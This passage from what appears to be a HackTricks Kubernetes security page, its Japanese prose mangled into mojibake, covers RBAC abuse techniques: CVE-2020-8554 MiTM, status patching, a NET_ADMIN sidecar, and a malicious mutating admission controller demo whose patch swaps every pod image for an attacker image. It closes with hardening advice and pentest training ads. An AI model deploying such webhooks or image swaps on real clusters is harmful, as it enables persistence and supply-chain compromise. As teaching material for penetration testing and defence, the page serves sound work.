**`services/status`** ã‚’ **å¤‰æ›´** ã§ãã‚‹ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«ã¯ã€`status.loadBalancer.ingress.ip` ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã‚’è¨­å®šã—ã¦ **æœªä¿®æ­£ã® CVE-2020-8554** ã‚’æ‚ªç”¨ã—ã€**ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼ã«å¯¾ã™ã‚‹ MiTM æ”»æ’ƒ** ã‚’é–‹å§‹ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚CVE-2020-8554 ã«å¯¾ã™ã‚‹ã»ã¨ã‚“ã©ã®ç·©å’Œç­–ã¯ã€ExternalIP ã‚µãƒ¼ãƒ“ã‚¹ã‚’é˜²ãã ã‘ã§ã™ï¼ˆ[**ã“ã¡ã‚‰**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/modify\_service\_status\_cve\_2020\_8554.rego) ã«ã‚ˆã‚‹ï¼‰ã€‚

### ãƒãƒ¼ãƒ‰ã¨ãƒãƒƒãƒ‰ã®ã‚¹ãƒ†ãƒ¼ã‚¿ã‚¹

`nodes/status` ã¾ãŸã¯ `pods/status` ã«å¯¾ã—ã¦ **`update`** ã¾ãŸã¯ **`patch`** æ¨©é™ã‚’æŒã¤ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«ã¯ã€ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒªãƒ³ã‚°åˆ¶ç´„ã«å½±éŸ¿ã‚’ä¸ãˆã‚‹ãƒ©ãƒ™ãƒ«ã‚’å¤‰æ›´ã§ãã¾ã™ã€‚

## çµ„ã¿è¾¼ã¿ã®ç‰¹æ¨©æ˜‡æ ¼é˜²æ­¢

Kubernetes ã«ã¯ã€ç‰¹æ¨©æ˜‡æ ¼ã‚’é˜²ããŸã‚ã® [çµ„ã¿è¾¼ã¿ãƒ¡ã‚«ãƒ‹ã‚ºãƒ ](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping) ãŒã‚ã‚Šã¾ã™ã€‚

ã“ã®ã‚·ã‚¹ãƒ†ãƒ ã¯ã€**ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒå½¹å‰²ã‚„å½¹å‰²ãƒã‚¤ãƒ³ãƒ‡ã‚£ãƒ³ã‚°ã‚’å¤‰æ›´ã™ã‚‹ã“ã¨ã§ç‰¹æ¨©ã‚’æ˜‡æ ¼ã•ã›ã‚‹ã“ã¨ãŒã§ããªã„**ã“ã¨ã‚’ä¿è¨¼ã—ã¾ã™ã€‚ã“ã®ãƒ«ãƒ¼ãƒ«ã®æ–½è¡Œã¯ API ãƒ¬ãƒ™ãƒ«ã§è¡Œã‚ã‚Œã€RBAC èªè¨¼è€…ãŒéã‚¢ã‚¯ãƒ†ã‚£ãƒ–ãªå ´åˆã§ã‚‚ä¿è­·ã‚’æä¾›ã—ã¾ã™ã€‚

ã“ã®ãƒ«ãƒ¼ãƒ«ã¯ã€**ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯å½¹å‰²ãŒå«ã‚€ã™ã¹ã¦ã®æ¨©é™ã‚’æŒã£ã¦ã„ã‚‹å ´åˆã«ã®ã¿å½¹å‰²ã‚’ä½œæˆã¾ãŸã¯æ›´æ–°ã§ãã‚‹**ã¨å®šã‚ã¦ã„ã¾ã™ã€‚ã•ã‚‰ã«ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®æ—¢å­˜ã®æ¨©é™ã®ç¯„å›²ã¯ã€ä½œæˆã¾ãŸã¯å¤‰æ›´ã—ã‚ˆã†ã¨ã—ã¦ã„ã‚‹å½¹å‰²ã®ç¯„å›²ã¨ä¸€è‡´ã—ãªã‘ã‚Œã°ãªã‚Šã¾ã›ã‚“ï¼šClusterRoles ã®å ´åˆã¯ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼å…¨ä½“ã€Roles ã®å ´åˆã¯åŒã˜ãƒãƒ¼ãƒ ã‚¹ãƒšãƒ¼ã‚¹ï¼ˆã¾ãŸã¯ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼å…¨ä½“ï¼‰ã«åˆ¶é™ã•ã‚Œã¾ã™ã€‚

{% hint style="warning" %}
å‰è¿°ã®ãƒ«ãƒ¼ãƒ«ã«ã¯ä¾‹å¤–ãŒã‚ã‚Šã¾ã™ã€‚ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«ãŒ **`roles`** ã¾ãŸã¯ **`clusterroles`** ã«å¯¾ã—ã¦ **å‹•è© `escalate`** ã‚’æŒã£ã¦ã„ã‚‹å ´åˆã€å½¼ã¯è‡ªåˆ†è‡ªèº«ãŒæ¨©é™ã‚’æŒã£ã¦ã„ãªãã¦ã‚‚å½¹å‰²ã‚„ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼å½¹å‰²ã®ç‰¹æ¨©ã‚’å¢—åŠ ã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
{% endhint %}

### **RoleBindings/ClusterRoleBindings ã®å–å¾—ã¨ãƒ‘ãƒƒãƒ**

{% hint style="danger" %}
**ã“ã®æŠ€è¡“ã¯ä»¥å‰ã¯æ©Ÿèƒ½ã—ã¦ã„ã¾ã—ãŸãŒã€ç§ã®ãƒ†ã‚¹ãƒˆã«ã‚ˆã‚‹ã¨ã€å‰ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§èª¬æ˜ã—ãŸç†ç”±ã§ã‚‚ã¯ã‚„æ©Ÿèƒ½ã—ã¦ã„ã¾ã›ã‚“ã€‚ã™ã§ã«æ¨©é™ã‚’æŒã£ã¦ã„ãªã„å ´åˆã€è‡ªåˆ†è‡ªèº«ã¾ãŸã¯åˆ¥ã® SA ã«ç‰¹æ¨©ã‚’ä¸ãˆã‚‹ãŸã‚ã« rolebinding ã‚’ä½œæˆ/å¤‰æ›´ã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ã€‚**
{% endhint %}

Rolebindings ã‚’ä½œæˆã™ã‚‹ç‰¹æ¨©ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒ **ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«å½¹å‰²ã‚’ãƒã‚¤ãƒ³ãƒ‰ã™ã‚‹** ã“ã¨ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚ã“ã®ç‰¹æ¨©ã¯ã€**ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒä¾µå®³ã•ã‚ŒãŸã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«ç®¡ç†è€…ç‰¹æ¨©ã‚’ãƒã‚¤ãƒ³ãƒ‰ã§ãã‚‹ãŸã‚ã€ç‰¹æ¨©æ˜‡æ ¼ã«ã¤ãªãŒã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚**

## ãã®ä»–ã®æ”»æ’ƒ

### ã‚µã‚¤ãƒ‰ã‚«ãƒ¼ ãƒ—ãƒ­ã‚­ã‚· ã‚¢ãƒ—ãƒª

ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€ãƒãƒƒãƒ‰é–“ã®é€šä¿¡ã«æš—å·åŒ–ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚ç›¸äº’èªè¨¼ã€åŒæ–¹å‘ã€ãƒãƒƒãƒ‰ã‹ã‚‰ãƒãƒƒãƒ‰ã¸ã€‚

#### ã‚µã‚¤ãƒ‰ã‚«ãƒ¼ ãƒ—ãƒ­ã‚­ã‚· ã‚¢ãƒ—ãƒªã®ä½œæˆ <a href="#create-a-sidecar-proxy-app" id="create-a-sidecar-proxy-app"></a>

ã‚ãªãŸã® .yaml ã‚’ä½œæˆã—ã¦ãã ã•ã„ã€‚
```bash
kubectl run app --image=bash --command -oyaml --dry-run=client > <appName.yaml> -- sh -c 'ping google.com'
```
.yamãƒ•ã‚¡ã‚¤ãƒ«ã‚’ç·¨é›†ã—ã€ã‚³ãƒ¡ãƒ³ãƒˆã‚¢ã‚¦ãƒˆã•ã‚Œã¦ã„ã‚‹è¡Œã‚’è¿½åŠ ã—ã¾ã™:
```yaml
#apiVersion: v1
#kind: Pod
#metadata:
#  name: security-context-demo
#spec:
#  securityContext:
#    runAsUser: 1000
#    runAsGroup: 3000
#    fsGroup: 2000
#  volumes:
#  - name: sec-ctx-vol
#    emptyDir: {}
#  containers:
#  - name: sec-ctx-demo
#    image: busybox
command: [ "sh", "-c", "apt update && apt install iptables -y && iptables -L && sleep 1h" ]
securityContext:
capabilities:
add: ["NET_ADMIN"]
#   volumeMounts:
#   - name: sec-ctx-vol
#     mountPath: /data/demo
#   securityContext:
#     allowPrivilegeEscalation: true
```
ãƒ—ãƒ­ã‚­ã‚·ã®ãƒ­ã‚°ã‚’ç¢ºèªã—ã¦ãã ã•ã„:
```bash
kubectl logs app -C proxy
```
More info at: [https://kubernetes.io/docs/tasks/configure-pod-container/security-context/](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

### æ‚ªæ„ã®ã‚ã‚‹Admission Controller

Admission Controllerã¯ã€ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®æ°¸ç¶šåŒ–ã®å‰ã«Kubernetes APIã‚µãƒ¼ãƒãƒ¼ã¸ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’**å‚å—**ã—ã¾ã™ãŒã€**ãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒèªè¨¼**ã•ã‚Œã€**æ‰¿èª**ã•ã‚ŒãŸå¾Œã§ã™ã€‚

æ”»æ’ƒè€…ãŒä½•ã‚‰ã‹ã®æ–¹æ³•ã§**Mutationg Admission Controllerã‚’æ³¨å…¥**ã™ã‚‹ã“ã¨ã«æˆåŠŸã™ã‚Œã°ã€**ã™ã§ã«èªè¨¼ã•ã‚ŒãŸãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’å¤‰æ›´**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€æ½œåœ¨çš„ã«æ¨©é™æ˜‡æ ¼ã‚’è¡Œã£ãŸã‚Šã€ã‚ˆã‚Šä¸€èˆ¬çš„ã«ã¯ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼å†…ã«æŒç¶šã™ã‚‹ã“ã¨ãŒå¯èƒ½ã«ãªã‚Šã¾ã™ã€‚

**ä¾‹ã¯** [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers) ã‹ã‚‰:
```bash
git clone https://github.com/rewanthtammana/malicious-admission-controller-webhook-demo
cd malicious-admission-controller-webhook-demo
./deploy.sh
kubectl get po -n webhook-demo -w
```
ã‚¹ãƒ†ãƒ¼ã‚¿ã‚¹ã‚’ç¢ºèªã—ã¦ã€æº–å‚™ãŒã§ãã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã—ã¾ã™ï¼š
```bash
kubectl get mutatingwebhookconfigurations
kubectl get deploy,svc -n webhook-demo
```
![mutating-webhook-status-check.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433436353/yHUvUWugR.png?auto=compress,format\&format=webp)

æ¬¡ã«ã€æ–°ã—ã„ãƒãƒƒãƒ‰ã‚’ãƒ‡ãƒ—ãƒ­ã‚¤ã—ã¾ã™:
```bash
kubectl run nginx --image nginx
kubectl get po -w
```
`ErrImagePull` ã‚¨ãƒ©ãƒ¼ãŒè¡¨ç¤ºã•ã‚ŒãŸå ´åˆã¯ã€æ¬¡ã®ã„ãšã‚Œã‹ã®ã‚¯ã‚¨ãƒªã§ã‚¤ãƒ¡ãƒ¼ã‚¸åã‚’ç¢ºèªã—ã¦ãã ã•ã„:
```bash
kubectl get po nginx -o=jsonpath='{.spec.containers[].image}{"\n"}'
kubectl describe po nginx | grep "Image: "
```
![malicious-admission-controller.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433512073/leFXtgSzm.png?auto=compress,format\&format=webp)

ä¸Šã®ç”»åƒã«ç¤ºã•ã‚Œã¦ã„ã‚‹ã‚ˆã†ã«ã€ç§ãŸã¡ã¯ã‚¤ãƒ¡ãƒ¼ã‚¸ `nginx` ã‚’å®Ÿè¡Œã—ã‚ˆã†ã¨ã—ã¾ã—ãŸãŒã€æœ€çµ‚çš„ã«å®Ÿè¡Œã•ã‚ŒãŸã‚¤ãƒ¡ãƒ¼ã‚¸ã¯ `rewanthtammana/malicious-image` ã§ã™ã€‚ä½•ãŒèµ·ã“ã£ãŸã®ã§ã—ã‚‡ã†ã‹ï¼Ÿ

#### Technicalities <a href="#heading-technicalities" id="heading-technicalities"></a>

`./deploy.sh` ã‚¹ã‚¯ãƒªãƒ—ãƒˆã¯ã€Kubernetes APIã¸ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ãã®è¨­å®šè¡Œã«å¾“ã£ã¦å¤‰æ›´ã™ã‚‹ãƒŸãƒ¥ãƒ¼ãƒ†ã‚¤ãƒ†ã‚£ãƒ³ã‚°ã‚¦ã‚§ãƒ–ãƒ›ãƒƒã‚¯ã‚¢ãƒ‰ãƒŸãƒƒã‚·ãƒ§ãƒ³ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ©ãƒ¼ã‚’ç¢ºç«‹ã—ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€è¦³å¯Ÿã•ã‚Œã‚‹çµæœã«å½±éŸ¿ã‚’ä¸ãˆã¾ã™ï¼š
```
patches = append(patches, patchOperation{
Op:    "replace",
Path:  "/spec/containers/0/image",
Value: "rewanthtammana/malicious-image",
})
```
The above snippet replaces the first container image in every pod with `rewanthtammana/malicious-image`.

## OPA Gatekeeper bypass

{% content-ref url="../kubernetes-opa-gatekeeper/kubernetes-opa-gatekeeper-bypass.md" %}
[kubernetes-opa-gatekeeper-bypass.md](../kubernetes-opa-gatekeeper/kubernetes-opa-gatekeeper-bypass.md)
{% endcontent-ref %}

## Best Practices

### **Service Account ãƒˆãƒ¼ã‚¯ãƒ³ã®è‡ªå‹•ãƒã‚¦ãƒ³ãƒˆã‚’ç„¡åŠ¹ã«ã™ã‚‹**

* **ãƒãƒƒãƒ‰ã¨ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆ**: ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€ãƒãƒƒãƒ‰ã¯ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆãƒˆãƒ¼ã‚¯ãƒ³ã‚’ãƒã‚¦ãƒ³ãƒˆã—ã¾ã™ã€‚ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚’å¼·åŒ–ã™ã‚‹ãŸã‚ã«ã€Kubernetesã¯ã“ã®è‡ªå‹•ãƒã‚¦ãƒ³ãƒˆæ©Ÿèƒ½ã‚’ç„¡åŠ¹ã«ã™ã‚‹ã“ã¨ã‚’è¨±å¯ã—ã¦ã„ã¾ã™ã€‚
* **é©ç”¨æ–¹æ³•**: Kubernetes ãƒãƒ¼ã‚¸ãƒ§ãƒ³ 1.6 ä»¥é™ã€ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã¾ãŸã¯ãƒãƒƒãƒ‰ã®è¨­å®šã§ `automountServiceAccountToken: false` ã‚’è¨­å®šã—ã¾ã™ã€‚

### **RoleBindings/ClusterRoleBindings ã«ãŠã‘ã‚‹åˆ¶é™ä»˜ããƒ¦ãƒ¼ã‚¶ãƒ¼å‰²ã‚Šå½“ã¦**

* **é¸æŠçš„ãªå«æœ‰**: RoleBindings ã¾ãŸã¯ ClusterRoleBindings ã«å¿…è¦ãªãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ã¿ã‚’å«ã‚ã‚‹ã‚ˆã†ã«ã—ã¾ã™ã€‚å®šæœŸçš„ã«ç›£æŸ»ã—ã€é–¢é€£æ€§ã®ãªã„ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’å‰Šé™¤ã—ã¦å³æ ¼ãªã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚’ç¶­æŒã—ã¾ã™ã€‚

### **ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼å…¨ä½“ã®ãƒ­ãƒ¼ãƒ«ã‚ˆã‚Šã‚‚åå‰ç©ºé–“ç‰¹æœ‰ã®ãƒ­ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã™ã‚‹**

* **ãƒ­ãƒ¼ãƒ«ã¨ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼ ãƒ­ãƒ¼ãƒ«**: ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼å…¨ä½“ã«é©ç”¨ã•ã‚Œã‚‹ ClusterRoles ãŠã‚ˆã³ ClusterRoleBindings ã‚ˆã‚Šã‚‚ã€åå‰ç©ºé–“ç‰¹æœ‰ã®æ¨©é™ã«ã¯ Roles ãŠã‚ˆã³ RoleBindings ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã‚’ãŠå‹§ã‚ã—ã¾ã™ã€‚ã“ã®ã‚¢ãƒ—ãƒ­ãƒ¼ãƒã¯ã€ã‚ˆã‚Šç´°ã‹ã„åˆ¶å¾¡ã‚’æä¾›ã—ã€æ¨©é™ã®ç¯„å›²ã‚’åˆ¶é™ã—ã¾ã™ã€‚

### **è‡ªå‹•åŒ–ãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã™ã‚‹**

{% embed url="https://github.com/cyberark/KubiScan" %}

{% embed url="https://github.com/aquasecurity/kube-hunter" %}

{% embed url="https://github.com/aquasecurity/kube-bench" %}

## **å‚è€ƒæ–‡çŒ®**

* [**https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions**](https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions)
* [**https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1**](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1)
* [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
